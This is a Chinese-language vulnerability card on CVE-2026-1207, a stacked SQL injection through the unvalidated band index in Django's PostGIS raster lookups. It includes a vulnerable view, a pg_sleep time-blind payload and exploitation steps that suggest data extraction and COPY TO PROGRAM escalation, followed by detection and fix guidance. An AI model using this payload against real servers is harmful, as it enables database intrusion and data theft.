---
id: web-generic-sqli-django-postgis-raster-band-index
title: CVE-2026-1207 Django PostGIS raster band index 未校验导致堆叠 SQL 注入
type: scenario
domain: web
path: web/generic/sqli
technique: django-postgis-raster-band-index-sqli
aliases:
- CVE-2026-1207
- Django raster lookup SQL 注入
- PostGIS band index 注入
- Django GIS SQL 注入
- band_rhs 注入
- RasterField contains 注入
tags:
- sqli
- python
- django
- postgis
- gis
- raster
- stacked-query
- cve-2026-1207
cve:
- CVE-2026-1207
severity: high
confidence: high
status: verified
affected_versions: Django 5.2.11（原文复现环境；官方补丁 commit 17a1d64a，原文未标注具体修复版本号）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V40
  verified_at: '2026-11-05T06:28:07+08:00'
  notes: 已对照原文与9张图核对：图01补丁为band_lhs/band_rhs增加isinstance int校验并抛TypeError；图02 check_raster两处 '%s, %s' 字符串插值；图03 settings ENGINE=postgis；图04请求band=1);select%20'1'||pg_sleep(3)%20--；图05 template_params rhss被注入；图06实际SQL为ST_Contains(...,1,%s,1);select '1'||pg_sleep(3) --且响应3130ms，堆叠注入成立；图07 MySQL不支持Transform、仅SpatiaLite走base实现；图08 SpatiaLite randomblob盲注；图09 Django官方拒绝srid报告邮件。卡内CVE-2026-1207、PoC、调用栈与原文一致；affected_versions仅写原文复现版本5.2.11与补丁commit，未猜修复版本。srid发现已按原文说明跳过，未单独成卡，合理。PoC未在本机执行。frontmatter 无 sources/source_url。
---

## 一句话结论

Django 的 PostGIS 后端在处理 raster 查询时，把 `band index`（`lookup.band_lhs` / `lookup.band_rhs`）直接 `%s` 拼进 SQL 模板，没有校验其必须为整数；当业务把用户输入作为 band index 传入 `RasterField` 查询（如 `rast__contains=(raster, band)`）时，可闭合表达式并堆叠执行任意 SQL，在 PostgreSQL 上实现时间盲注。

## 原理

- Django 的 GIS 查询在需要调用数据库空间函数时无法使用参数化占位符，只能把部分片段拼进 SQL 模板；`PostGISOperator#check_raster` 负责把 raster 查询的波段索引注入模板参数。
- 修复前该方法只判断 `lookup.band_lhs is not None and lhs_is_raster`，随后执行 `template_params["lhs"] = "%s, %s" % (template_params["lhs"], lookup.band_lhs)`；`band_rhs` 同理。两处都是字符串插值，未检查类型。
- 若 band index 来自 `request.GET` 等不可信输入且未被强制转 int，就会原样进入最终 SQL。例如 `band=1);select '1'||pg_sleep(3) --` 会闭合 `ST_Contains(..., 1, <band>, 1)` 的括号，并用 `--` 注释后续内容。
- PostgreSQL 的驱动允许一次 `execute` 提交多条语句，因此 `;select ...` 形成堆叠注入；即使不回显，也可用 `pg_sleep()` 做时间盲注。
- 官方补丁在 `check_raster` 中对 `band_lhs`、`band_rhs` 增加 `isinstance(..., int)` 检查，不满足就抛 `TypeError("Band index must be an integer, but got ...")`，从源头阻断字符串进入模板。
- 该漏洞只影响 PostGIS 后端的 raster lookups；普通字段查询和其他 GIS 后端不走这段拼接。

## 触发条件

- Django 版本在受影响区间（原文在 5.2.11 复现，修复补丁为 commit `17a1d64a58ef24c0c3b78d66d86f5415075f18f0`）。
- 数据库为 PostgreSQL + PostGIS，并启用 `postgis_raster` 扩展；模型使用 `RasterField`。
- 业务代码把外部可控值作为 band index 传给 raster lookup，例如 `RasterModel.objects.filter(rast__contains=(raster_obj, band))`。
- 代码未对 band 做 `int()` 转换或白名单校验。
- 数据库账号允许执行堆叠语句（PostgreSQL 默认允许）。

## 利用步骤

1. 确认接口接受 band/波段参数并传入 `RasterField` 的 raster lookup（如 `__contains`、`__intersects` 等）。
2. 发送正常整数 band，观察返回正常，确认查询路径可达。
3. 构造闭合 payload：`1);select '1'||pg_sleep(3) --`，URL 编码后提交。
4. 观察响应时间；若延迟约 3 秒，说明堆叠语句执行，注入成立。
5. 将 `pg_sleep(3)` 替换为布尔/子查询提取语句，逐字符读取数据库内容；也可尝试 `COPY ... TO PROGRAM` 等 PostgreSQL 特性扩大危害（需相应权限）。

## PoC

漏洞视图核心：

```python
def get(self, request):
    band = request.GET.get("band", 1)
    rast = GDALRaster({...})  # 任意合法 raster
    qs = RasterModel.objects.filter(rast__contains=(rast, band))
    print(qs.query)
    qs.count()
```

时间盲注请求：

```http
GET /book/search?band=1);select%20%271%27||pg_sleep(3)%20-- HTTP/1.1
Host: 127.0.0.1:8087
```

URL 解码后的 band：

```text
1);select '1'||pg_sleep(3) --
```

生成的 SQL（原文调试输出）：

```sql
SELECT COUNT(*) AS "__count" FROM "vuln_rastermodel"
WHERE ST_Contains("vuln_rastermodel"."rast", 1, %s, 1);
select '1'||pg_sleep(3) --', params=(<PostGISAdapter object>,)
```

响应耗时约 3.13 秒（原文截图），证明 `pg_sleep(3)` 被执行。

## 变体与关联

- 变体：`band_rhs`（右侧 raster 的波段索引）同样未校验，若业务允许控制右操作数的 band，可复用同一 payload 形态。
- 变体：其他 raster lookup（`__intersects`、`__coveredby` 等）只要走到 `check_raster` 且 band 可控，注入点一致。
- 变体：若堆叠被驱动/中间件限制，可改为在表达式内构造布尔或时间条件（PostgreSQL 的 `pg_sleep`、`CASE WHEN`）。
- 关联：[[web-generic-sqli-django-filteredrelation-alias]]（同为 Django ORM 无法参数化的标识符/片段拼接导致注入）。
- 关联：[[web-generic-sqli-hibernate-hql-native-query-injection]]（ORM 底层字符串拼接的同类根因）。
- 原文另提到 `get_geom_placeholder` 的 `value.srid` 也未校验，但需要开发者自定义 `GEOSGeometry` 子类并用 `object.__setattr__` 绕过 setter，官方以“开发者自建恶意抽象、非用户可控”为由拒绝，属开发者自伤而非真实攻击面，未单独成卡。

## 检测与防御

- **日志检测**：raster 查询的 band 参数出现 `)`、`;`、`--`、`/*`、`select`、`pg_sleep` 等；数据库日志出现 `ST_Contains(...);select` 形式的多语句；请求耗时异常固定（如 3 秒）。
- **WAF**：对 band/波段参数只允许数字，出现非数字字符直接拒绝。
- **修复**：升级到包含 `check_raster` 类型校验的 Django 版本；业务层对 band 做 `int()` 转换并捕获异常。
- **加固**：数据库账号最小权限，禁止应用账号执行 `COPY ... PROGRAM`、`pg_read_file` 等高危函数；对 GIS 查询接口增加鉴权与速率限制。
